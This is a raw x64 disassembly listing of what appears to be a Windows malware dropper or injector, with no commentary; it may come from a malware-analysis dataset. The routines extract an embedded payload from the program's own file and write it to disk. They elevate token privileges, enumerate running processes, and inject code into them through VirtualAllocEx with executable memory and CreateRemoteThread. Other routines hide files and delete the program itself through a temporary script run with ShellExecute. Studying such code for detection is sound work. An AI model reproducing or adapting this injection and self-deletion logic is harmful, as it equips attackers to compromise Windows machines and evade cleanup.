sub_140001000
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x50
xor ebx ebx
mov rsi rdx
xor r9d r9d
mov [ rsp + 0x30 ] rbx
lea r8d [ rbx + 0x1 ]
mov edx 0x80000000
mov [ rsp + 0x28 ] 0x80
mov [ rsp + 0x78 ] ebx
mov [ rsp + 0x20 ] 0x4
call [ CreateFileW@IAT ]
mov rdi rax
cmp rax 0xffffffffffffffff
jne r-xdata
mov r9d 0x2
xor r8d r8d
mov rcx rax
lea edx [ r9 - 0x6 ]
call [ SetFilePointer@IAT ]
lea r9 [ rsp + 0x40 ]
lea rdx [ rsp + 0x78 ]
mov r8d 0x4
mov rcx rdi
mov [ rsp + 0x40 ] ebx
mov [ rsp + 0x20 ] rbx
call [ ReadFile@IAT ]
test eax eax
je r-xdata
xor eax eax
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
add rsp 0x50
pop rdi
retn
mov rcx rdi
call [ CloseHandle@IAT ]
mov rsi [ rsp + 0x68 ]
mov eax ebx
mov rbx [ rsp + 0x60 ]
add rsp 0x50
pop rdi
retn
cmp [ rsp + 0x40 ] 0x4
jne r-xdata
mov edx [ rsp + 0x78 ]
lea eax [ rdx - 0x1 ]
cmp eax 0x7fe
ja r-xdata
neg edx
mov r9d 0x2
xor r8d r8d
mov [ rsp + 0x78 ] edx
add edx 0xfffffffc
mov rcx rdi
call [ SetFilePointer@IAT ]
mov r8d [ rsp + 0x78 ]
lea r9 [ rsp + 0x40 ]
neg r8d
mov rdx rsi
mov rcx rdi
mov [ rsp + 0x20 ] rbx
call [ ReadFile@IAT ]
mov ebx [ rsp + 0x78 ]
neg ebx
nop [ rax + rax ] ax
sub_140001110
mov [ rsp + 0x8 ] rbx
push rbp
push rsi
push rdi
sub rsp 0x860
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x850 ] rax
mov rdi r8
mov rsi rdx
lea rcx [ rsp + 0x51 ]
xor edx edx
mov r8d 0x7ff
movsxd rbp r9d
mov [ rsp + 0x50 ] 0x0
call sub_140005d40
lea rcx [ rsp + 0x50 ]
mov r8 rbp
mov rdx rdi
mov [ rsp + 0x40 ] 0x0
call sub_140006ba0
xor r9d r9d
mov [ rsp + 0x30 ] 0x0
lea r8d [ r9 + 0x1 ]
mov edx 0x40000000
mov rcx rsi
mov [ rsp + 0x28 ] 0x80
mov [ rsp + rbp + 0x50 ] ebp
mov [ rsp + 0x20 ] 0x4
call [ CreateFileW@IAT ]
mov rbx rax
cmp rax 0xffffffffffffffff
jne r-xdata
mov r9d 0x2
xor r8d r8d
xor edx edx
mov rcx rax
call [ SetFilePointer@IAT ]
lea r8d [ rbp + 0x4 ]
lea r9 [ rsp + 0x40 ]
lea rdx [ rsp + 0x50 ]
mov rcx rbx
mov [ rsp + 0x20 ] 0x0
call [ WriteFile@IAT ]
mov rcx rbx
call [ SetEndOfFile@IAT ]
mov rcx rbx
call [ CloseHandle@IAT ]
mov eax 0x1
xor eax eax
jmp r-xdata
mov rcx [ rsp + 0x850 ]
xor rcx rsp
call sub_140002370
mov rbx [ rsp + 0x880 ]
add rsp 0x860
pop rdi
pop rsi
pop rbp
retn
sub_140001240
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx rcx
lea rcx [ r--data ]
xor edi edi
mov [ rsp + 0x38 ] edi
call [ GetModuleHandleW@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
mov eax [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea rdx [ rsp + 0x38 ]
mov rcx rbx
call rax
mov ecx [ rsp + 0x38 ]
test eax eax
cmove ecx edi
mov eax ecx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_1400012d0
mov [ rsp + 0x20 ] rbx
push rbp
push rsi
push rdi
sub rsp 0x880
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x870 ] rax
mov ebp ecx
mov rbx rdx
lea rcx [ rsp + 0x62 ]
xor edi edi
xor edx edx
mov r8d 0x7fe
mov [ rsp + 0x60 ] di
call sub_140005d40
xor r11d r11d
mov [ rsp + 0x860 ] r11
mov [ rsp + 0x868 ] r11
mov rsi rdi
mov [ rsp + 0x40 ] rdi
test ebp ebp
jne r-xdata
lea rcx [ rsp + 0x60 ]
mov r8d 0x3ff
mov rdx rbx
call sub_140002390
lea rcx [ r--data ]
call [ GetModuleHandleW@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
mov [ rsp + 0x868 ] rax
call sub_140001540
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov rax [ rw-data ]
mov [ rsp + 0x860 ] rax
call [ GetCurrentProcess@IAT ]
lea r8 [ rsp + 0x40 ]
mov rcx rax
mov edx 0x20
call [ rw-data ]
mov rbx [ rsp + 0x40 ]
lea r8 [ rsp + 0x4c ]
lea rdx [ r--data ]
xor ecx ecx
mov [ rsp + 0x48 ] 0x1
call [ rw-data ]
lea r8 [ rsp + 0x48 ]
mov r9d 0x10
xor edx edx
mov rcx rbx
mov [ rsp + 0x28 ] rdi
mov [ rsp + 0x54 ] 0x2
mov [ rsp + 0x20 ] rdi
call [ rw-data ]
mov r8d ebp
xor edx edx
mov ecx 0x1fffff
call [ rw-data ]
mov rbx rax
test rax rax
je r-xdata
mov rcx [ rsp + 0x870 ]
xor rcx rsp
call sub_140002370
mov rbx [ rsp + 0x8b8 ]
add rsp 0x880
pop rdi
pop rsi
pop rbp
retn
mov rcx [ rsp + 0x40 ]
test rcx rcx
je r-xdata
mov rcx rax
call sub_1400012b0
test eax eax
je r-xdata
test rbx rbx
je r-xdata
call [ CloseHandle@IAT ]
xor edx edx
mov r9d 0x3000
mov r8d 0x810
mov rcx rbx
mov [ rsp + 0x8b0 ] r12
mov [ rsp + 0x20 ] 0x40
call [ VirtualAllocEx@IAT ]
mov r12 rax
test rax rax
je r-xdata
test rsi rsi
je r-xdata
mov rcx rbx
call [ CloseHandle@IAT ]
mov r12 [ rsp + 0x8b0 ]
lea r8 [ rsp + 0x60 ]
mov r9d 0x810
mov rdx rax
mov rcx rbx
mov [ rsp + 0x20 ] rdi
call [ rw-data ]
test eax eax
je r-xdata
mov eax edi
mov rcx rsi
call [ CloseHandle@IAT ]
xor edx edx
mov r9d 0x3000
mov r8d 0x3e8
mov rcx rbx
mov [ rsp + 0x20 ] 0x40
call [ VirtualAllocEx@IAT ]
mov rbp rax
test rax rax
je r-xdata
lea r8 [ sub_140001220 ]
mov r9d 0x3e8
mov rdx rax
mov rcx rbx
mov [ rsp + 0x20 ] rdi
call [ rw-data ]
test eax eax
je r-xdata
mov [ rsp + 0x30 ] rdi
mov r9 rbp
xor r8d r8d
xor edx edx
mov rcx rbx
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] r12
call [ CreateRemoteThread@IAT ]
test rax rax
mov rsi rax
setne dil
sub_140001540
push rbx
sub rsp 0x20
lea rcx [ r--data ]
call [ GetModuleHandleW@IAT ]
lea rdx [ r--data ]
mov rcx rax
mov rbx rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rcx [ r--data ]
mov [ rw-data ] rax
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
mov rbx rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
cmp [ rw-data ] 0x0
mov [ rw-data ] rax
je r-xdata
xor eax eax
add rsp 0x20
pop rbx
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
add rsp 0x20
pop rbx
retn
sub_1400016f0
mov r11 rsp
mov [ r11 + 0x8 ] rbx
mov [ r11 + 0x10 ] rbp
mov [ r11 + 0x18 ] rsi
push rdi
sub rsp 0xc0
xor eax eax
xor ebp ebp
mov rsi rcx
mov [ r11 - 0x58 ] rax
mov [ r11 - 0x50 ] rax
mov [ r11 - 0x48 ] rax
mov [ r11 - 0x40 ] rax
mov [ r11 - 0x38 ] rax
mov [ r11 - 0x30 ] rax
mov [ r11 - 0x28 ] rax
mov [ r11 - 0x20 ] rax
mov [ r11 - 0x18 ] rax
lea rax [ r11 - 0x68 ]
lea rcx [ r--data ]
mov rbx r8
mov [ r11 - 0x40 ] rax
lea rax [ r11 - 0x60 ]
mov rdi rdx
mov [ r11 - 0x60 ] rbp
mov [ r11 - 0x68 ] rbp
mov [ r11 - 0x58 ] 0x48
mov [ r11 - 0x20 ] rax
mov [ r11 - 0x50 ] 0x10003
mov [ r11 - 0x48 ] 0x10
mov [ r11 - 0x38 ] rbp
mov [ r11 - 0x30 ] 0x10004
mov [ r11 - 0x28 ] 0x8
call [ GetModuleHandleW@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
lea r11 [ rsp + 0xc0 ]
mov rbx [ r11 + 0x10 ]
mov rbp [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
lea rcx [ rsp + 0x70 ]
mov r9 rsi
xor r8d r8d
mov [ rsp + 0x50 ] rcx
mov [ rsp + 0x48 ] rbp
mov [ rsp + 0x40 ] rbp
mov [ rsp + 0x38 ] ebp
mov [ rsp + 0x30 ] ebp
lea rcx [ rsp + 0xe8 ]
mov edx 0x1fffff
mov [ rsp + 0x28 ] rbx
mov [ rsp + 0xe8 ] rbp
mov [ rsp + 0x20 ] rdi
call rax
mov rcx [ rsp + 0xe8 ]
test eax eax
cmovs rcx rbp
mov rax rcx
sub_140001810
mov rax rsp
push rbp
sub rsp 0x70
mov [ rax + 0x8 ] rbx
mov [ rax - 0x10 ] rsi
mov [ rax - 0x18 ] rdi
mov ebx ecx
mov [ rax - 0x28 ] r13
or rcx 0xffffffffffffffff
mov rdi rdx
xor ebp ebp
mov r13 rdx
mov [ rax + 0x20 ] rbp
xor eax eax
[ rdi ]
not rcx
lea rsi [ rcx - 0x1 ]
call sub_140001540
test eax eax
je r-xdata
mov rcx [ rsp + 0x98 ]
mov r13 [ rsp + 0x50 ]
mov rdi [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
mov rbx [ rsp + 0x80 ]
test rcx rcx
je r-xdata
call [ GetCurrentProcess@IAT ]
lea r8 [ rsp + 0x98 ]
lea edx [ rbp + 0x20 ]
mov rcx rax
call [ rw-data ]
mov rdi [ rsp + 0x98 ]
lea r8 [ rsp + 0x44 ]
lea rdx [ r--data ]
xor ecx ecx
mov [ rsp + 0x40 ] 0x1
call [ rw-data ]
lea r9d [ rbp + 0x10 ]
lea r8 [ rsp + 0x40 ]
xor edx edx
mov rcx rdi
mov [ rsp + 0x28 ] rbp
mov [ rsp + 0x4c ] 0x2
mov [ rsp + 0x20 ] rbp
call [ rw-data ]
mov r8d ebx
xor edx edx
mov ecx 0x1fffff
call [ rw-data ]
mov rdi rax
test rax rax
je r-xdata
mov eax ebp
add rsp 0x70
pop rbp
retn
call [ CloseHandle@IAT ]
lea rsi [ rsi + rsi + 0x2 ]
mov r9d 0x1000
xor edx edx
mov rcx rax
mov r8 rsi
mov [ rsp + 0x20 ] 0x4
call [ VirtualAllocEx@IAT ]
mov rbx rax
test rax rax
je r-xdata
mov rcx rdi
call [ CloseHandle@IAT ]
lea rcx [ r--data ]
mov [ rsp + 0x58 ] r12
call [ GetModuleHandleW@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
mov r12 rax
test rax rax
jne r-xdata
lea rax [ rsp + 0x90 ]
mov r9d esi
mov r8 r13
mov rdx rbx
mov rcx rdi
mov [ rsp + 0x20 ] rax
call [ rw-data ]
test eax eax
jne r-xdata
mov r9d 0x8000
mov r8 rsi
mov rdx rbx
mov rcx rdi
call [ VirtualFreeEx@IAT ]
jmp r-xdata
lea rcx [ r--data ]
call [ GetModuleHandleW@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
mov r9d 0x8000
mov r8 rsi
mov rdx rbx
mov rcx rdi
call [ VirtualFreeEx@IAT ]
jmp r-xdata
mov r12 [ rsp + 0x58 ]
mov [ rsp + 0x30 ] rbp
mov r9 r12
xor r8d r8d
xor edx edx
mov rcx rdi
mov [ rsp + 0x28 ] ebp
mov [ rsp + 0x20 ] rbx
call [ CreateRemoteThread@IAT ]
mov r8 rbx
mov rdx r12
mov rcx rdi
call sub_1400016f0
jmp r-xdata
mov edx 0x1388
mov rcx rax
call [ WaitForSingleObject@IAT ]
test eax eax
je r-xdata
mov r9d 0x8000
mov r8 rsi
mov rdx rbx
mov rcx rdi
call [ VirtualFreeEx@IAT ]
jmp r-xdata
test rax rax
jne r-xdata
mov r9d 0x8000
mov r8 rsi
mov rdx rbx
mov rcx rdi
call [ VirtualFreeEx@IAT ]
mov ebp 0x1
mov r9d 0x8000
mov r8 rsi
mov rdx rbx
mov rcx rdi
call [ VirtualFreeEx@IAT ]
jmp r-xdata
sub_140001ab0
push rbx
sub rsp 0x20
mov rbx rcx
test rdx rdx
jne r-xdata
add rdx 0x20
call sub_140001a80
test rax rax
je r-xdata
xor eax eax
add rsp 0x20
pop rbx
retn
lea rdx [ rax + 0x78 ]
mov rcx rbx
add rsp 0x20
pop rbx
jmp sub_140001a80
sub_140001af0
mov r11 rsp
mov [ r11 + 0x8 ] rbx
mov [ r11 + 0x10 ] rsi
push rdi
sub rsp 0x60
xor eax eax
mov rsi rdx
mov r8d ecx
xor ebx ebx
xor edx edx
mov ecx 0x410
mov [ rsp + 0x30 ] ebx
mov [ r11 - 0x30 ] rax
mov [ r11 - 0x28 ] rax
mov [ r11 - 0x20 ] rax
mov [ r11 - 0x18 ] rax
mov [ r11 - 0x10 ] rax
call [ OpenProcess@IAT ]
mov rdi rax
test rax rax
jne r-xdata
mov rax [ rw-data ]
test rax rax
jne r-xdata
mov rbx [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
add rsp 0x60
pop rdi
retn
lea r8 [ rsp + 0x30 ]
mov r9d 0x30
xor edx edx
mov rcx rdi
mov [ rsp + 0x20 ] rbx
call rax
test eax eax
jne r-xdata
lea rcx [ r--data ]
call [ GetModuleHandleA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
mov [ rw-data ] rax
mov rcx rdi
call [ CloseHandle@IAT ]
mov rsi [ rsp + 0x78 ]
mov eax ebx
mov rbx [ rsp + 0x70 ]
add rsp 0x60
pop rdi
retn
mov rdx [ rsp + 0x38 ]
mov rcx rdi
call sub_140001ab0
lea rcx [ rsp + 0x88 ]
mov r9d 0x1f4
mov [ rsp + 0x20 ] rcx
mov rcx rdi
mov r8 rsi
mov rdx rax
call [ ReadProcessMemory@IAT ]
mov ecx 0x1
test eax eax
cmovne ebx ecx
sub_140001bf0
sub rsp 0x48
call [ GetCurrentProcess@IAT ]
lea r8 [ rsp + 0x60 ]
mov edx 0x20028
mov rcx rax
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
lea r8 [ rsp + 0x68 ]
lea rdx [ r--data ]
xor ecx ecx
call [ LookupPrivilegeValueW@IAT ]
test eax eax
jne r-xdata
add rsp 0x48
retn
mov rax [ rsp + 0x68 ]
mov rcx [ rsp + 0x60 ]
mov [ rsp + 0x40 ] rbx
xor ebx ebx
lea r8 [ rsp + 0x30 ]
xor r9d r9d
xor edx edx
mov [ rsp + 0x28 ] rbx
mov [ rsp + 0x34 ] rax
mov [ rsp + 0x30 ] 0x1
mov [ rsp + 0x3c ] 0x2
mov [ rsp + 0x20 ] rbx
call [ AdjustTokenPrivileges@IAT ]
mov rcx [ rsp + 0x60 ]
call [ CloseHandle@IAT ]
call [ GetLastError@IAT ]
test eax eax
sete bl
mov eax ebx
mov rbx [ rsp + 0x40 ]
add rsp 0x48
retn
mov eax 0x1
add rsp 0x48
retn
sub_140001ca0
push rbp
push r12
push r13
sub rsp 0x670
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x660 ] rax
mov rbp rcx
lea rcx [ r--data ]
mov edx 0x1
call sub_140001bf0
lea rcx [ rsp + 0x24 ]
xor r13d r13d
xor edx edx
mov r8d 0x234
mov [ rsp + 0x20 ] r13d
call sub_140005d40
xor edx edx
lea ecx [ rdx + 0x2 ]
call CreateToolhelp32Snapshot
mov r12 rax
cmp rax 0xffffffffffffffff
je r-xdata
mov rcx [ rsp + 0x660 ]
xor rcx rsp
call sub_140002370
add rsp 0x670
pop r13
pop r12
pop rbp
retn
lea rdx [ rsp + 0x20 ]
mov rcx rax
mov [ rsp + 0x20 ] 0x238
call Process32FirstW
test eax eax
je r-xdata
mov [ rsp + 0x698 ] rbx
mov [ rsp + 0x6a0 ] rsi
mov [ rsp + 0x6a8 ] rdi
nop [ rax ] eax
lea rcx [ rsp + 0x262 ]
xor edx edx
mov r8d 0x3fe
mov [ rsp + 0x260 ] r13w
call sub_140005d40
mov ecx [ rsp + 0x28 ]
lea rdx [ rsp + 0x260 ]
mov r8d 0x1f4
call sub_140001af0
or rcx 0xffffffffffffffff
xor eax eax
lea rdi [ rsp + 0x260 ]
[ rdi ]
lea rdi [ r--data ]
not rcx
lea rdx [ rcx - 0x1 ]
or rcx 0xffffffffffffffff
[ rdi ]
not rcx
dec rcx
test ecx ecx
je r-xdata
movsxd rsi ecx
movsxd rcx edx
lea rdi [ rsp + 0x4c ]
mov rax rsi
imul rax rax 0xfffffffffffffffe
lea rax [ rsp + rax + 0x4c ]
lea rbx [ rax + rcx * 2 ]
lea rax [ rsp + 0x4c ]
cmp rax rbx
ja r-xdata
mov edi [ rsp + 0x28 ]
mov rdx rbp
mov ecx edi
call sub_1400012d0
test eax eax
jne r-xdata
movsxd rsi ecx
movsxd rcx edx
lea rdi [ rsp + 0x260 ]
mov rax rsi
imul rax rax 0xfffffffffffffffe
lea rax [ rsp + rax + 0x260 ]
lea rbx [ rax + rcx * 2 ]
lea rax [ rsp + 0x260 ]
cmp rax rbx
ja r-xdata
lea rdx [ rsp + 0x20 ]
mov rcx r12
call Process32NextW
test eax eax
jne r-xdata
nop [ rax + rax ] ax
mov rdx rbp
mov ecx edi
call sub_140001810
lea rdx [ r--data ]
mov r8 rsi
mov rcx rdi
call sub_1400025b0
test eax eax
je r-xdata
or rcx 0xffffffffffffffff
xor eax eax
lea rdi [ rsp + 0x4c ]
[ rdi ]
lea rdi [ r--data ]
not rcx
lea rdx [ rcx - 0x1 ]
or rcx 0xffffffffffffffff
[ rdi ]
not rcx
dec rcx
test ecx ecx
je r-xdata
mov rcx r12
call [ CloseHandle@IAT ]
mov rdi [ rsp + 0x6a8 ]
mov rsi [ rsp + 0x6a0 ]
mov rbx [ rsp + 0x698 ]
test rdi rdi
je r-xdata
add rdi 0x2
cmp rdi rbx
jbe r-xdata
test rdi rdi
je r-xdata
add rdi 0x2
cmp rdi rbx
jbe r-xdata
lea rdx [ r--data ]
mov r8 rsi
mov rcx rdi
call sub_1400025b0
test eax eax
je r-xdata
jmp r-xdata
jmp r-xdata
sub_140001f00
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x40
xor ebx ebx
xor r9d r9d
mov edx 0x40000000
mov [ rsp + 0x30 ] rbx
lea r8d [ rbx + 0x1 ]
mov [ rsp + 0x28 ] 0x80
mov [ rsp + 0x20 ] 0x2
call [ CreateFileW@IAT ]
mov rdi rax
cmp rax 0xffffffffffffffff
jne r-xdata
lea r9 [ rsp + 0x68 ]
lea rdx [ rw-data ]
mov r8d 0x80a00
mov rcx rax
mov [ rsp + 0x68 ] ebx
mov [ rsp + 0x20 ] rbx
call [ WriteFile@IAT ]
mov rcx rdi
mov ebx eax
call [ FlushFileBuffers@IAT ]
mov rcx rdi
call [ CloseHandle@IAT ]
mov eax ebx
mov rbx [ rsp + 0x50 ]
add rsp 0x40
pop rdi
retn
xor eax eax
mov rbx [ rsp + 0x50 ]
add rsp 0x40
pop rdi
retn
sub_140001f90
sub rsp 0x7f8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x7e0 ] rax
lea rcx [ rsp + 0x81 ]
xor edx edx
mov r8d 0x103
mov [ rsp + 0x80 ] 0x0
call sub_140005d40
lea rdx [ rsp + 0x80 ]
mov r8d 0x104
xor ecx ecx
call [ GetModuleFileNameA@IAT ]
lea rcx [ rsp + 0x80 ]
call [ DeleteFileA@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
mov rcx [ rsp + 0x7e0 ]
xor rcx rsp
call sub_140002370
add rsp 0x7f8
retn
mov [ rsp + 0x800 ] rbx
lea rcx [ rsp + 0x2c1 ]
xor edx edx
mov r8d 0x12b
mov [ rsp + 0x808 ] rsi
mov [ rsp + 0x2c0 ] al
mov [ rsp + 0x7f0 ] rdi
call sub_140005d40
lea rdx [ rsp + 0x2c0 ]
mov ecx 0x12c
call [ GetTempPathA@IAT ]
lea rcx [ rsp + 0x191 ]
xor edx edx
mov r8d 0x12b
mov [ rsp + 0x190 ] 0x0
call sub_140005d40
lea r9 [ rsp + 0x190 ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x2c0 ]
xor r8d r8d
call [ GetTempFileNameA@IAT ]
lea rcx [ rsp + 0x190 ]
call [ DeleteFileA@IAT ]
xor eax eax
or rcx 0xffffffffffffffff
xor esi esi
lea rdi [ rsp + 0x190 ]
xor r9d r9d
[ rdi ]
mov eax [ r--data ]
mov [ rsp + 0x30 ] rsi
mov [ rdi - 0x1 ] eax
movzx eax [ r--data ]
lea r8d [ rsi + 0x1 ]
lea rcx [ rsp + 0x190 ]
mov edx 0x40000000
mov [ rsp + 0x28 ] 0x80
mov [ rdi + 0x3 ] al
mov [ rsp + 0x20 ] 0x2
call [ CreateFileA@IAT ]
lea rcx [ rsp + 0x3f1 ]
xor edx edx
mov r8d 0x3e7
mov rbx rax
mov [ rsp + 0x3f0 ] sil
call sub_140005d40
mov rcx [ r--data ]
mov rdx [ r--data ]
mov rax [ r--data ]
lea rdi [ rsp + 0x48 ]
lea r9 [ rsp + 0x80 ]
lea r8 [ rsp + 0x80 ]
mov [ rdi ] rcx
mov rcx [ r--data ]
mov [ rdi + 0x8 ] rcx
mov rcx [ r--data ]
mov [ rdi + 0x10 ] rcx
mov [ rdi + 0x18 ] rdx
mov [ rdi + 0x20 ] rax
mov rax [ r--data ]
lea rdx [ rsp + 0x48 ]
lea rcx [ rsp + 0x3f0 ]
mov [ rdi + 0x28 ] rax
movzx eax [ r--data ]
mov [ rdi + 0x30 ] ax
call sub_140002658
or rcx 0xffffffffffffffff
xor eax eax
lea rdi [ rsp + 0x3f0 ]
lea r9 [ rsp + 0x40 ]
[ rdi ]
lea rdx [ rsp + 0x3f0 ]
mov [ rsp + 0x20 ] rsi
not rcx
lea r8 [ rcx - 0x1 ]
mov rcx rbx
call [ WriteFile@IAT ]
mov rcx rbx
call [ CloseHandle@IAT ]
mov [ rsp + 0x28 ] esi
mov [ rsp + 0x20 ] rsi
lea r9 [ r--data ]
lea r8 [ rsp + 0x190 ]
lea rdx [ r--data ]
xor ecx ecx
call [ ShellExecuteA@IAT ]
lea rcx [ rsp + 0x80 ]
mov edx 0x80
call [ SetFileAttributesA@IAT ]
mov rdi [ rsp + 0x7f0 ]
mov rsi [ rsp + 0x808 ]
mov rbx [ rsp + 0x800 ]
sub_140002220
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x6a0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x690 ] rax
lea rcx [ rsp + 0x32 ]
xor esi esi
xor edx edx
mov r8d 0x256
mov [ rsp + 0x30 ] si
call sub_140005d40
lea rdx [ rsp + 0x30 ]
mov r8d 0x12c
xor ecx ecx
call [ GetModuleFileNameW@IAT ]
lea rcx [ rsp + 0x291 ]
xor edx edx
mov r8d 0x3ff
mov [ rsp + 0x290 ] sil
call sub_140005d40
lea rdx [ rsp + 0x290 ]
lea rcx [ rsp + 0x30 ]
xor r8d r8d
call sub_140001000
or rcx 0xffffffffffffffff
lea rdi [ rsp + 0x30 ]
mov ebx eax
xor eax eax
lea rdx [ rw-data ]
[ rdi ]
mov rcx [ r--data ]
mov r8d 0x80a00
mov [ rdi - 0x2 ] rcx
mov rcx [ r--data ]
mov [ rdi + 0x6 ] rcx
movzx ecx [ r--data ]
mov [ rdi + 0xe ] cx
lea rcx [ rsp + 0x30 ]
call sub_140001f00
test eax eax
je r-xdata
call sub_140001f90
xor eax eax
mov rcx [ rsp + 0x690 ]
xor rcx rsp
call sub_140002370
lea r11 [ rsp + 0x6a0 ]
mov rbx [ r11 + 0x10 ]
mov rsi [ r11 + 0x18 ]
mov rsp r11
pop rdi
retn
lea r8 [ rsp + 0x290 ]
lea rdx [ rsp + 0x30 ]
mov r9d ebx
xor ecx ecx
mov [ rsp + 0x20 ] esi
call sub_140001110
lea edx [ rsi + 0x2 ]
lea rcx [ rsp + 0x30 ]
call [ SetFileAttributesW@IAT ]
lea rcx [ rsp + 0x30 ]
call sub_140001ca0
sub_140002390
mov [ rsp + 0x8 ] rdi
xor edi edi
mov r9 rcx
cmp r8 rdi
je r-xdata
mov rdi [ rsp + 0x8 ]
mov rax r9
retn
movzx eax [ rdx ]
add rdx 0x2
mov [ rcx ] ax
add rcx 0x2
cmp ax di
je r-xdata
cmp r8 rdi
je r-xdata
sub r8 0x1
jne r-xdata
sub r8 0x1
je r-xdata
movzx eax di
mov rdi rcx
mov rcx r8
[ rdi ]
sub_1400023d8
push rbx
sub rsp 0x20
mov rbx rcx
mov [ rcx + 0x18 ] 0x0
test rdx rdx
jne r-xdata
movdqu xmm0 [ rdx ]
movdqu [ rcx ] xmm0
call sub_140003750
mov [ rbx + 0x10 ] rax
mov rdx [ rax + 0xc0 ]
mov [ rbx ] rdx
mov rcx [ rax + 0xb8 ]
mov [ rbx + 0x8 ] rcx
mov rcx [ rw-data ]
cmp rdx rcx
je r-xdata
mov rax [ rw-data ]
cmp [ rbx + 0x8 ] rax
je r-xdata
mov eax [ rax + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
mov rax [ rbx + 0x10 ]
test [ rax + 0xc8 ] 0x2
jne r-xdata
mov rax [ rbx + 0x10 ]
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
jne r-xdata
call sub_14000355c
mov [ rbx ] rax
mov rax rbx
add rsp 0x20
pop rbx
retn
or [ rax + 0xc8 ] 0x2
mov [ rbx + 0x18 ] 0x1
jmp r-xdata
call sub_140002c64
mov [ rbx + 0x8 ] rax
sub_140002484
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x50
xor r12d r12d
mov rbp r8
mov rsi rdx
mov rdi rcx
mov eax r12d
cmp r8 r12
je r-xdata
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
mov rdi [ rsp + 0x78 ]
add rsp 0x50
pop r12
retn
cmp rcx r12
jne r-xdata
cmp rdx r12
je r-xdata
call sub_140003b30
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r12
mov [ rax ] 0x16
call sub_140003a60
mov eax 0x7fffffff
jmp r-xdata
lea rcx [ rsp + 0x30 ]
mov rdx r9
call sub_1400023d8
mov r11 [ rsp + 0x30 ]
cmp [ r11 + 0x14 ] r12d
jne r-xdata
movzx ecx [ rdi ]
lea rdx [ rsp + 0x30 ]
call sub_140003bb8
movzx ecx [ rsi ]
lea rdx [ rsp + 0x30 ]
mov bx ax
call sub_140003bb8
add rdi 0x2
add rsi 0x2
sub rbp 0x1
je r-xdata
movzx ebx [ rdi ]
cmp bx 0x41
jb r-xdata
movzx ecx ax
movzx eax bx
sub eax ecx
cmp [ rsp + 0x48 ] r12b
je r-xdata
cmp bx r12w
je r-xdata
movzx eax [ rsi ]
cmp ax 0x41
jb r-xdata
cmp bx 0x5a
ja r-xdata
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
cmp bx ax
je r-xdata
add rdi 0x2
add rsi 0x2
sub rbp 0x1
je r-xdata
cmp ax 0x5a
ja r-xdata
add bx 0x20
cmp bx r12w
je r-xdata
add ax 0x20
cmp bx ax
je r-xdata
jmp r-xdata
sub_1400025b0
push rbx
sub rsp 0x30
